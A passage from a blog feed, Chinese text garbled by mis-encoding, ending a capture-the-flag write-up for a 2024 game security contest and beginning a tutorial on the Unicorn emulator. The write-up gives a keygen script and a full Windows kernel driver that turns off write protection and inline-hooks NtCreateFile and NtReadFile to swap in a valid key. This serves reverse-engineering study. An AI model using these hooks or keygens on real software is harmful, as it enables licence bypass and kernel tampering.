<h3 id="æ‰¾åˆ°ç”¨æˆ·åä¸ºadministratorçš„KEY-ä½œä¸ºç­”æ¡ˆæäº¤-ç¼–å†™æ³¨å†Œæœº"><a href="#æ‰¾åˆ°ç”¨æˆ·åä¸ºadministratorçš„KEY-ä½œä¸ºç­”æ¡ˆæäº¤-ç¼–å†™æ³¨å†Œæœº" class="headerlink" title="æ‰¾åˆ°ç”¨æˆ·åä¸ºadministratorçš„KEY ä½œä¸ºç­”æ¡ˆæäº¤ &amp;&amp; ç¼–å†™æ³¨å†Œæœº"></a>æ‰¾åˆ°ç”¨æˆ·åä¸ºadministratorçš„KEY ä½œä¸ºç­”æ¡ˆæäº¤ &amp;&amp; ç¼–å†™æ³¨å†Œæœº</h3><p>æ³¨å†Œæœº:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mask = (<span class="number">1</span> &lt;&lt; <span class="number">32</span>) - <span class="number">1</span></span><br><span class="line">username = <span class="string">b&#x27;administrator&#x27;</span></span><br><span class="line">checksum = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> username:</span><br><span class="line">    checksum = ((c + checksum) * <span class="number">0x1003f</span>) &amp; mask</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;username.decode()&#125;</span>-<span class="subst">&#123;checksum&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># administrator-4007951923</span></span><br></pre></td></tr></table></figure>

<p>è€ŒTask3éœ€è¦æ— è®ºåŠ è½½åˆ°çš„card.txtå†…å®¹æ˜¯ä»€ä¹ˆéƒ½èƒ½æ­£å¸¸åŠ è½½é©±åŠ¨ ä¸Šé¢çš„é€»è¾‘ä¹Ÿèƒ½çœ‹å‡ºæ¥ä¸»è¦å°±æ˜¯ç”¨æˆ·åçš„æ ¡éªŒå’ŒéªŒè¯ è¿™é‡Œç›´æ¥é€šè¿‡ä¿®æ”¹æˆ‘ä»¬çš„è¯»å–å‡½æ•°å°†æ­£ç¡®çš„ç”¨æˆ·åå’Œå¯†é’¥å¤åˆ¶åˆ°ä»æ–‡ä»¶å¥æŸ„è¯»å–åˆ°çš„å†…å­˜é‡Œå³å¯</p>
<h3 id="ç¼–å†™ä¸€ä¸ªexp-åœ¨expç¨‹åºè¿è¡Œå-å¯¹äºä»»æ„çš„ç”¨æˆ·å-key-Loader-syså‡èƒ½æ­£ç¡®å¯åŠ¨"><a href="#ç¼–å†™ä¸€ä¸ªexp-åœ¨expç¨‹åºè¿è¡Œå-å¯¹äºä»»æ„çš„ç”¨æˆ·å-key-Loader-syså‡èƒ½æ­£ç¡®å¯åŠ¨" class="headerlink" title="ç¼–å†™ä¸€ä¸ªexp åœ¨expç¨‹åºè¿è¡Œå å¯¹äºä»»æ„çš„ç”¨æˆ·å-key Loader.syså‡èƒ½æ­£ç¡®å¯åŠ¨"></a>ç¼–å†™ä¸€ä¸ªexp åœ¨expç¨‹åºè¿è¡Œå å¯¹äºä»»æ„çš„ç”¨æˆ·å-key Loader.syså‡èƒ½æ­£ç¡®å¯åŠ¨</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">NTSTATUS <span class="title function_">myreadfile</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ HANDLE FileHandle,</span></span><br><span class="line"><span class="params">    _In_opt_ HANDLE Event,</span></span><br><span class="line"><span class="params">    _In_opt_ PIO_APC_ROUTINE ApcRoutine,</span></span><br><span class="line"><span class="params">    _In_opt_ PVOID ApcContext,</span></span><br><span class="line"><span class="params">    _Out_ PIO_STATUS_BLOCK IoStatusBlock,</span></span><br><span class="line"><span class="params">    _Out_writes_bytes_(Length) PVOID Buffer,</span></span><br><span class="line"><span class="params">    _In_ ULONG Length,</span></span><br><span class="line"><span class="params">    _In_opt_ PLARGE_INTEGER ByteOffset,</span></span><br><span class="line"><span class="params">    _In_opt_ PULONG Key</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    dohook2(FALSE);</span><br><span class="line">    readfile_ptr readfile = (readfile_ptr)HookAddr2;</span><br><span class="line">    NTSTATUS status = readfile(</span><br><span class="line">        FileHandle,</span><br><span class="line">        Event,</span><br><span class="line">        ApcRoutine,</span><br><span class="line">        ApcContext,</span><br><span class="line">        IoStatusBlock,</span><br><span class="line">        Buffer,</span><br><span class="line">        Length,</span><br><span class="line">        ByteOffset,</span><br><span class="line">        Key</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (FileHandler &amp;&amp; FileHandler == FileHandle) &#123;</span><br><span class="line">        kprintf(<span class="string">&quot;Line %d: Reading card.txt detected in NtReadFile\n&quot;</span>, __LINE__);</span><br><span class="line">        <span class="comment">//DbgBreakPoint();</span></span><br><span class="line">        <span class="comment">/* Replace the user-key with the right one */</span></span><br><span class="line">        u8 CorrectPair[] = <span class="string">&quot;ACE-4051574845\x00&quot;</span>;</span><br><span class="line">        <span class="built_in">memset</span>(Buffer, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(Buffer, CorrectPair, <span class="built_in">strlen</span>(CorrectPair));</span><br><span class="line">        <span class="comment">/* Replace the user-key with the right one */</span></span><br><span class="line">    &#125;</span><br><span class="line">    dohook2(TRUE);</span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å®Œæ•´é©±åŠ¨ä»£ç :</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntdef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntstatus.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntstrsafe.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_BACKTRACE_DEPTH 0x20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYM <span class="string">L&quot;\\??\\Hook_API&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, __VA_ARGS__)</span></span><br><span class="line"><span class="keyword">typedef</span> UINT64 u64;</span><br><span class="line"><span class="keyword">typedef</span> UINT32 u32;</span><br><span class="line"><span class="keyword">typedef</span> UINT16 u16;</span><br><span class="line"><span class="keyword">typedef</span> UINT8  u8;</span><br><span class="line"></span><br><span class="line">u8 mov_jmp_rax1[<span class="number">12</span>] = &#123;</span><br><span class="line">    <span class="number">0x48</span>,<span class="number">0xB8</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,	<span class="comment">//mov rax,xxx</span></span><br><span class="line">    <span class="number">0xFF</span>,<span class="number">0xE0</span>											<span class="comment">//jmp rax</span></span><br><span class="line">&#125;, mov_jmp_rax2[<span class="number">12</span>] = &#123;</span><br><span class="line">    <span class="number">0x48</span>,<span class="number">0xB8</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,	<span class="comment">//mov rax,xxx</span></span><br><span class="line">    <span class="number">0xFF</span>,<span class="number">0xE0</span>											<span class="comment">//jmp rax</span></span><br><span class="line">&#125;, origin1[<span class="number">12</span>] = &#123;</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x00</span></span><br><span class="line">&#125;, origin2[<span class="number">12</span>] = &#123;</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">u8* HookAddr1 = <span class="literal">NULL</span>, * HookAddr2 = <span class="literal">NULL</span>, Hooked1 = FALSE, Hooked2 = FALSE;</span><br><span class="line"></span><br><span class="line">KIRQL <span class="title function_">writeProtectOFFx64</span><span class="params">()</span> &#123;</span><br><span class="line">    KIRQL OldIrql;</span><br><span class="line">    OldIrql = KeRaiseIrqlToDpcLevel();</span><br><span class="line">    __writecr0(__readcr0() &amp; ~<span class="number">0x10000</span>);</span><br><span class="line">    _disable();</span><br><span class="line">    <span class="keyword">return</span> OldIrql;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">writeProtectONx64</span><span class="params">(KIRQL OldIrql)</span> &#123;</span><br><span class="line">    _enable();</span><br><span class="line">    __writecr0(__readcr0() | <span class="number">0x10000</span>);</span><br><span class="line">    KeLowerIrql(OldIrql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">dohook1</span><span class="params">(u8 HOOK)</span> &#123;</span><br><span class="line">    Hooked1 = HOOK;</span><br><span class="line">    KIRQL irql = writeProtectOFFx64();</span><br><span class="line">    <span class="keyword">if</span> (HookAddr1) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!HOOK) &#123;</span><br><span class="line">            <span class="built_in">memcpy</span>(HookAddr1, origin1, <span class="keyword">sizeof</span>(origin1));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">memcpy</span>(HookAddr1, mov_jmp_rax1, <span class="keyword">sizeof</span>(mov_jmp_rax1));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    writeProtectONx64(irql);</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line">NTSTATUS <span class="title function_">dohook2</span><span class="params">(u8 HOOK)</span> &#123;</span><br><span class="line">    Hooked2 = HOOK;</span><br><span class="line">    KIRQL irql = writeProtectOFFx64();</span><br><span class="line">    <span class="keyword">if</span> (HookAddr2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!HOOK) &#123;</span><br><span class="line">            <span class="built_in">memcpy</span>(HookAddr2, origin2, <span class="keyword">sizeof</span>(origin2));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">memcpy</span>(HookAddr2, mov_jmp_rax2, <span class="keyword">sizeof</span>(mov_jmp_rax2));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    writeProtectONx64(irql);</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(*createfile_ptr)</span><span class="params">(</span></span><br><span class="line"><span class="params">    _Out_ PHANDLE FileHandle,</span></span><br><span class="line"><span class="params">    _In_ ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">    _In_ PCOBJECT_ATTRIBUTES ObjectAttributes,</span></span><br><span class="line"><span class="params">    _Out_ PIO_STATUS_BLOCK IoStatusBlock,</span></span><br><span class="line"><span class="params">    _In_opt_ PLARGE_INTEGER AllocationSize,</span></span><br><span class="line"><span class="params">    _In_ ULONG FileAttributes,</span></span><br><span class="line"><span class="params">    _In_ ULONG ShareAccess,</span></span><br><span class="line"><span class="params">    _In_ ULONG CreateDisposition,</span></span><br><span class="line"><span class="params">    _In_ ULONG CreateOptions,</span></span><br><span class="line"><span class="params">    _In_reads_bytes_opt_(EaLength) PVOID EaBuffer,</span></span><br><span class="line"><span class="params">    _In_ ULONG EaLength</span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(*readfile_ptr)</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ HANDLE FileHandle,</span></span><br><span class="line"><span class="params">    _In_opt_ HANDLE Event,</span></span><br><span class="line"><span class="params">    _In_opt_ PIO_APC_ROUTINE ApcRoutine,</span></span><br><span class="line"><span class="params">    _In_opt_ PVOID ApcContext,</span></span><br><span class="line"><span class="params">    _Out_ PIO_STATUS_BLOCK IoStatusBlock,</span></span><br><span class="line"><span class="params">    _Out_writes_bytes_(Length) PVOID Buffer,</span></span><br><span class="line"><span class="params">    _In_ ULONG Length,</span></span><br><span class="line"><span class="params">    _In_opt_ PLARGE_INTEGER ByteOffset,</span></span><br><span class="line"><span class="params">    _In_opt_ PULONG Key</span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line"></span><br><span class="line">HANDLE FileHandler = <span class="literal">NULL</span>;</span><br><span class="line">NTSTATUS <span class="title function_">mycreatefile</span><span class="params">(</span></span><br><span class="line"><span class="params">    _Out_ PHANDLE FileHandle,</span></span><br><span class="line"><span class="params">    _In_ ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">    _In_ PCOBJECT_ATTRIBUTES ObjectAttributes,</span></span><br><span class="line"><span class="params">    _Out_ PIO_STATUS_BLOCK IoStatusBlock,</span></span><br><span class="line"><span class="params">    _In_opt_ PLARGE_INTEGER AllocationSize,</span></span><br><span class="line"><span class="params">    _In_ ULONG FileAttributes,</span></span><br><span class="line"><span class="params">    _In_ ULONG ShareAccess,</span></span><br><span class="line"><span class="params">    _In_ ULONG CreateDisposition,</span></span><br><span class="line"><span class="params">    _In_ ULONG CreateOptions,</span></span><br><span class="line"><span class="params">    _In_reads_bytes_opt_(EaLength) PVOID EaBuffer,</span></span><br><span class="line"><span class="params">    _In_ ULONG EaLength</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    dohook1(FALSE);</span><br><span class="line">    createfile_ptr createfile = (createfile_ptr)HookAddr1;</span><br><span class="line">    NTSTATUS status = createfile(</span><br><span class="line">        FileHandle,</span><br><span class="line">        DesiredAccess,</span><br><span class="line">        ObjectAttributes,</span><br><span class="line">        IoStatusBlock,</span><br><span class="line">        AllocationSize,</span><br><span class="line">        FileAttributes,</span><br><span class="line">        ShareAccess,</span><br><span class="line">        CreateDisposition,</span><br><span class="line">        CreateOptions,</span><br><span class="line">        EaBuffer,</span><br><span class="line">        EaLength</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (!wcscmp(ObjectAttributes-&gt;ObjectName-&gt;Buffer, <span class="string">L&quot;\\??\\C:\\card.txt&quot;</span>)) &#123;</span><br><span class="line">        kprintf(<span class="string">&quot;Line %d: Reading card.txt detected in NtCreateFile\n&quot;</span>, __LINE__);</span><br><span class="line">        FileHandler = *FileHandle;</span><br><span class="line">    &#125;</span><br><span class="line">    dohook1(TRUE);</span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">myreadfile</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ HANDLE FileHandle,</span></span><br><span class="line"><span class="params">    _In_opt_ HANDLE Event,</span></span><br><span class="line"><span class="params">    _In_opt_ PIO_APC_ROUTINE ApcRoutine,</span></span><br><span class="line"><span class="params">    _In_opt_ PVOID ApcContext,</span></span><br><span class="line"><span class="params">    _Out_ PIO_STATUS_BLOCK IoStatusBlock,</span></span><br><span class="line"><span class="params">    _Out_writes_bytes_(Length) PVOID Buffer,</span></span><br><span class="line"><span class="params">    _In_ ULONG Length,</span></span><br><span class="line"><span class="params">    _In_opt_ PLARGE_INTEGER ByteOffset,</span></span><br><span class="line"><span class="params">    _In_opt_ PULONG Key</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    dohook2(FALSE);</span><br><span class="line">    readfile_ptr readfile = (readfile_ptr)HookAddr2;</span><br><span class="line">    NTSTATUS status = readfile(</span><br><span class="line">        FileHandle,</span><br><span class="line">        Event,</span><br><span class="line">        ApcRoutine,</span><br><span class="line">        ApcContext,</span><br><span class="line">        IoStatusBlock,</span><br><span class="line">        Buffer,</span><br><span class="line">        Length,</span><br><span class="line">        ByteOffset,</span><br><span class="line">        Key</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (FileHandler &amp;&amp; FileHandler == FileHandle) &#123;</span><br><span class="line">        kprintf(<span class="string">&quot;Line %d: Reading card.txt detected in NtReadFile\n&quot;</span>, __LINE__);</span><br><span class="line">        <span class="comment">//DbgBreakPoint();</span></span><br><span class="line">        <span class="comment">/* Replace the user-key with the right one */</span></span><br><span class="line">        u8 CorrectPair[] = <span class="string">&quot;ACE-4051574845\x00&quot;</span>;</span><br><span class="line">        <span class="built_in">memset</span>(Buffer, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(Buffer, CorrectPair, <span class="built_in">strlen</span>(CorrectPair));</span><br><span class="line">        <span class="comment">/* Replace the user-key with the right one */</span></span><br><span class="line">    &#125;</span><br><span class="line">    dohook2(TRUE);</span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DeleteDevice</span><span class="params">(PDRIVER_OBJECT pDriver)</span> &#123;</span><br><span class="line">    kprintf(<span class="string">&quot;Line %d: Deleting Driver\n&quot;</span>, __LINE__);</span><br><span class="line">    <span class="keyword">if</span> (pDriver-&gt;DeviceObject) &#123;</span><br><span class="line">        UNICODE_STRING DeviceName;</span><br><span class="line">        RtlInitUnicodeString(&amp;DeviceName, SYM);</span><br><span class="line">        IoDeleteSymbolicLink(&amp;DeviceName);</span><br><span class="line">        IoDeleteDevice(pDriver-&gt;DeviceObject);</span><br><span class="line">    &#125;</span><br><span class="line">    kprintf(<span class="string">&quot;Line %d: Driver Deleted\n&quot;</span>, __LINE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span> &#123;</span><br><span class="line">    kprintf(<span class="string">&quot;Line %d: Unloading Driver\n&quot;</span>, __LINE__);</span><br><span class="line">    <span class="keyword">if</span> (Hooked1) &#123;</span><br><span class="line">        dohook1(FALSE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (Hooked2) &#123;</span><br><span class="line">        dohook2(FALSE);</span><br><span class="line">    &#125;</span><br><span class="line">    DeleteDevice(pDriver);</span><br><span class="line">    kprintf(<span class="string">&quot;Line %d: Driver Unloaded\n&quot;</span>, __LINE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ PDRIVER_OBJECT DriverObject,</span></span><br><span class="line"><span class="params">    _In_ PUNICODE_STRING RegistryPath</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    DriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line">    kprintf(<span class="string">&quot;Line %d: Driver Loaded, RegistryPath : %S\n&quot;</span>, __LINE__, RegistryPath-&gt;Buffer);</span><br><span class="line">    HookAddr1 = (u64)NtCreateFile;</span><br><span class="line">    HookAddr2 = (u64)NtReadFile;</span><br><span class="line">    kprintf(<span class="string">&quot;Line %d: HookAddr1 : 0x%llx, HookAddr2 : 0x%llx\n&quot;</span>, __LINE__, HookAddr1, HookAddr2);</span><br><span class="line">    <span class="keyword">if</span> (!HookAddr1 || !HookAddr2) &#123;</span><br><span class="line">        kprintf(<span class="string">&quot;Line %d: HookAddr1 or HookAddr2 is NULL\n&quot;</span>, __LINE__);</span><br><span class="line">        <span class="keyword">return</span> STATUS_UNSUCCESSFUL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(origin1, HookAddr1, <span class="keyword">sizeof</span>(origin1));</span><br><span class="line">    <span class="built_in">memcpy</span>(origin2, HookAddr2, <span class="keyword">sizeof</span>(origin2));</span><br><span class="line">    *((u64*)(mov_jmp_rax1 + <span class="number">2</span>)) = (u64)mycreatefile;</span><br><span class="line">    *((u64*)(mov_jmp_rax2 + <span class="number">2</span>)) = (u64)myreadfile;</span><br><span class="line">    dohook1(TRUE);</span><br><span class="line">    dohook2(TRUE);</span><br><span class="line">    kprintf(<span class="string">&quot;Line %d: Hooked NtCreateFile and NtReadFile\n&quot;</span>, __LINE__);</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‚è€ƒ</p>
<blockquote>
<p>è…¾è®¯æ¸¸æˆå®‰å…¨å¤§èµ›2024å†³èµ›é¢˜è§£  <a href="https://xia0ji233.pro/2024/04/22/tencent-race-2024-pre-final/index.html">https://xia0ji233.pro/2024/04/22/tencent-race-2024-pre-final/index.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>äºŒè¿›åˆ¶</category>
        <category>Reverse</category>
        <category>Windowså†…æ ¸</category>
      </categories>
      <tags>
        <tag>Reverse</tag>
        <tag>Writeups</tag>
        <tag>Kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>Unicornå¼•æ“å­¦ä¹ </title>
    <url>/2025/04/23/Unicorn%E5%BC%95%E6%93%8E%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>å¦‚æœæ—©çŸ¥é“ å­¦Angrä¹Ÿä¼šè¢«èƒŒåˆºâ€¦</p>
<span id="more"></span>

<p>åŒæ ·ä½œä¸ºæ¨¡æ‹Ÿæ‰§è¡Œå¼•æ“ unicornç›¸æ¯”angrè™½ç„¶æ²¡æœ‰å†…ç½®çš„z3å¼•æ“ ä½†æ˜¯å°±ä½¿ç”¨ä½“éªŒä¸Šæ¥è¯´ååˆ†çš„æ˜“ä¸Šæ‰‹ å†åŠ ä¸Šæ³¨å†Œä»£ç å›è°ƒå‡½æ•°(hook)çš„åŠŸèƒ½ç”¨èµ·æ¥ä¸å¯è°“ä¸èˆ’æœ</p>
<h2 id="æ¨¡æ‹Ÿæ‰§è¡Œçš„å‡†å¤‡å·¥ä½œ"><a href="#æ¨¡æ‹Ÿæ‰§è¡Œçš„å‡†å¤‡å·¥ä½œ" class="headerlink" title="æ¨¡æ‹Ÿæ‰§è¡Œçš„å‡†å¤‡å·¥ä½œ"></a>æ¨¡æ‹Ÿæ‰§è¡Œçš„å‡†å¤‡å·¥ä½œ</h2><p>ä¹‹æ‰€ä»¥è¯´å®ƒæ˜“ä¸Šæ‰‹ æ˜¯å› ä¸ºå®ƒçš„ä½¿ç”¨æ–¹æ³•å’Œkeystone, capstoneè¿™ä¸¤ä¸ªæ±‡ç¼–ç›¸å…³å¼•æ“å¾ˆç›¸ä¼¼ æŒ‡å®šä¸€ä¸ªæ¡†æ¶å’Œæ¨¡å¼å°±èƒ½å¼€å§‹æ¨¡æ‹Ÿæ‰§è¡Œäº†</p>
<p>ä»¥X86_64ä¸ºä¾‹ æ¨¡æ‹Ÿæ‰§è¡Œå‰éœ€è¦åˆ›å»º<code>unicorn.Uc</code>å¯¹è±¡</p>
<p><code>uc = Uc(UC_ARCH_X86, UC_MODE_64)</code></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯è¿›è¡Œå†…å­˜æ˜ å°„ ä½¿ç”¨<code>Uc.mem_map(addr, size)</code>è¿›è¡Œå†…å­˜æ˜ å°„ä»¥è·å–å­˜æ”¾ä»£ç å’Œæ ˆæˆ–è€…æ•°æ®çš„å­—èŠ‚çš„ä»¥æ˜ å°„å†…å­˜ ç›®å‰çœ‹æ¥æ˜ å°„å†…å­˜éœ€è¦é¡µå¯¹é½ å¦åˆ™ä¼šæŠ¥é”™ ä¿é™©èµ·è§ä¸€ä¸ªé¡µå®šåœ¨1mb(0x400 ** 2 byte)</p>
<p> <code>PAGE = 0x400 ** 2</code></p>
<p>æ­¤åæ˜ å°„å†…å­˜æ—¶addrå’Œsizeæœ€å¥½éƒ½æ˜¯<code>n * PAGE</code>çš„å½¢å¼</p>
<p>unicornçš„æ¨¡æ‹Ÿæ‰§è¡Œä¸éœ€è¦è¯»å–å®Œæ•´ä»£ç  åªéœ€è¦æƒ³è¦æ‰§è¡Œçš„ä»£ç ç‰‡æ®µè¢«å†™å…¥äº†å¯¹åº”çš„ä½ç½®å³å¯ ä½†æ˜¯ä¸ºäº†æ–¹ä¾¿ä¹Ÿå¯ä»¥ç›´æ¥å°†äºŒè¿›åˆ¶æ–‡ä»¶è¯»åˆ°æ­£ç¡®çš„å†…å­˜ä¸Š:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">CODE = <span class="number">0</span></span><br><span class="line">STACK= PAGE</span><br><span class="line">uc.mem_map(CODE,  PAGE)</span><br><span class="line">uc.mem_map(STACK, PAGE)</span><br><span class="line">uc.mem_write(CODE, <span class="built_in">open</span>(<span class="string">&#x27;.\\to_emu&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line">uc.reg_write(UC_X86_REG_RSP, STACK + PAGE // <span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>æ ˆåŸºå€å¯ä»¥éšä¾¿å®š è€ŒCODEéœ€è¦ä¿è¯è¯»åˆ°çš„ä»£ç æ®µå­—èŠ‚åœ¨æ­£ç¡®çš„ä½ç½®ä¸Š æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯æ‰“å¼€IDAçœ‹ç¨‹åºåŸºå€ å°†CODEè®¾ä¸ºè¿™ä¸ªåŸºå€å³å¯</p>
<p>unicornä¸­è¯»å†™å¯„å­˜å™¨, å†…å­˜çš„æ–¹æ³•ä¹Ÿå¾ˆç®€å• åªç”¨<code>Uc.[mem|reg]_[read|write]()</code>4ä¸ªå‡½æ•°å°±å¯ä»¥å®Œæˆ è¯»å†™å¯„å­˜å™¨æ—¶å¯ä»¥ç›´æ¥ç”¨unicornä¸­å‡†å¤‡å¥½çš„å®å®šä¹‰æ ‡è¯†è¦è¯»å†™çš„å¯„å­˜å™¨ è¿™äº›å®å®šä¹‰å°†ä¸€ä¸ªç»„ä»¶åæ˜ å°„åˆ°ä¸€ä¸ªæ•´å‹ä¸Š æ ¼å¼éƒ½æ˜¯<code>UC_ARCH_TYPE_xxx</code></p>
<h2 id="å¼€å§‹-ç»“æŸæ¨¡æ‹Ÿæ‰§è¡Œ"><a href="#å¼€å§‹-ç»“æŸæ¨¡æ‹Ÿæ‰§è¡Œ" class="headerlink" title="å¼€å§‹&#x2F;ç»“æŸæ¨¡æ‹Ÿæ‰§è¡Œ"></a>å¼€å§‹&#x2F;ç»“æŸæ¨¡æ‹Ÿæ‰§è¡Œ</h2><p>unicornä¸­è¦å¼€å§‹å’Œç»“æŸæ¨¡æ‹Ÿæ‰§è¡Œä¹Ÿåªç”±ä¸¤ä¸ªå‡½æ•°è´Ÿè´£<code>Uc.emu_[start|stop]()</code> å¼€å§‹æ¨¡æ‹Ÿæ‰§è¡Œåªéœ€è¦æŒ‡å®šå¼€å§‹æ‰§è¡Œçš„åœ°å€å’Œç»“æŸåœ°å€</p>
<h2 id="Hook-Unhookä»£ç "><a href="#Hook-Unhookä»£ç " class="headerlink" title="Hook&#x2F;Unhookä»£ç "></a>Hook&#x2F;Unhookä»£ç </h2><p>uncornæä¾›äº†å‡ ç§ä¸åŒç­‰çº§çš„hook è¿™é‡Œåªä»‹ç»æœ€é€šç”¨çš„code hook</p>
<p>å½“æ³¨å†Œäº†code hookå å’ŒIDAä¸‹æ¡ä»¶æ–­ç‚¹ä¸€æ · åœ¨æ‰§è¡Œå½“å‰æŒ‡ä»¤å‰ä¼šå…ˆæ‰§è¡Œæˆ‘ä»¬çš„hookå‡½æ•°</p>
<h3 id="æ·»åŠ Hook"><a href="#æ·»åŠ Hook" class="headerlink" title="æ·»åŠ Hook"></a>æ·»åŠ Hook</h3><p>ä½¿ç”¨<code>hook_handle = Uc.hook_add(UC_HOOK_CODE, hook)</code>æ¥æ·»åŠ ä¸€ä¸ªä»£ç å›è°ƒ<code>hook</code> å‡½æ•°è¿”å›ä¸€ä¸ªå›è°ƒå‡½æ•°å¥æŸ„ åœ¨åç»­åˆ é™¤hookæ—¶è¦ç”¨åˆ° å¤šæ¬¡æ·»åŠ hookä¸ä¼šè¦†ç›–æ‰å‰é¢çš„ è€Œæ˜¯é“¾å¼è°ƒç”¨å„ä¸ªhook</p>
